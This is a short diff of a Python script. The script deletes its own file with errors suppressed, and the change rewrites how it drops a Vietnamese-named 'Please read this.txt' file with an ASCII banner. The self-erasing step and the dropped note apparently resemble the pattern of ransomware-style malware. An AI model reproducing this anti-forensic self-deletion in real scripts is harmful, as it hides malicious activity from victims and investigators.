@@ -4,8 +4,7 @@ try:__import__('os').unlink(__import__('sys').argv[0])
 except:pass
 try:__import__('os').unlink(__file__)
 except:pass
-with open("Vui lòng đọc cái này.txt", "w", encoding="utf-8") as f:
-    f.write("""==========================================================
+open("Vui lòng đọc cái này.txt", "w", encoding="utf-8").write(r"""==========================================================
         _______ ____   ____  _      
        |__   __/ __ \ / __ \| |     
           | | | |  | | |  | | |     
